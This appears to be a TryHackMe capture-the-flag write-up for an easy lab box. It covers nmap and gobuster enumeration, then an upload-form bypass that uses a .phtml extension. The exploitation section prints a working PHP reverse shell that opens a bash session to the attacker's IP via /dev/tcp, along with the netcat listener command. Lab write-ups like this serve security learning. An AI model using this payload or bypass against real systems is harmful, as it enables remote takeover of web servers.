## Info
- Platform: TryHackMe  
- Difficulty: Easy

---

## Enumeration

### Nmap
<img width="1354" height="496" alt="Screenshot_2025-09-15_07-51-01" src="https://github.com/user-attachments/assets/4e5ebf3c-d71b-4094-823f-3a5300071568" />

- Open ports: 22 (SSH), 80 (HTTP).

---

### Gobuster
```bash
gobuster dir -u http://10.10.27.133 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.27.133
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta.txt             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.27.133/css/]
/index.php            (Status: 200) [Size: 616]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 309] [--> http://10.10.27.133/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.27.133/panel/]
/server-status        (Status: 403) [Size: 277]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.27.133/uploads/]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

---

## Exploitation
### File Upload
<img width="1919" height="833" alt="Screenshot_2025-09-15_07-57-26" src="https://github.com/user-attachments/assets/b93eb415-3a3b-4e65-9102-f22b601ce505" />

- The `/panel` directory contained an upload form.


<img width="760" height="522" alt="image" src="https://github.com/user-attachments/assets/fc70fc64-494a-4686-8bc7-43eed3f917a9" />

- Direct .php files were blocked (PHP não é permitido!).
- Bypassed by uploading a reverse shell with .phtml extension.

### Reverse Shell
- Payload used `shell.phtml`:
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.21.4.114/4444 0>&1'");
?>
```

- Listener started:
```bash
nc -lvnp 4444
```
- Triggered via: http://10.10.27.133/uploads/shell.phtml
- Shell obtained as www-data:

<img width="1677" height="306" alt="image" src="https://github.com/user-attachments/assets/0374431f-5818-487e-81f5-e8c205e57dc1" />

---

### First Flag
<img width="303" height="83" alt="1" src="https://github.com/user-attachments/assets/cee5eb86-95ed-434c-88d3-fa5cce411ed2" />

- Flag found: `[FLAG FOUND]`

---

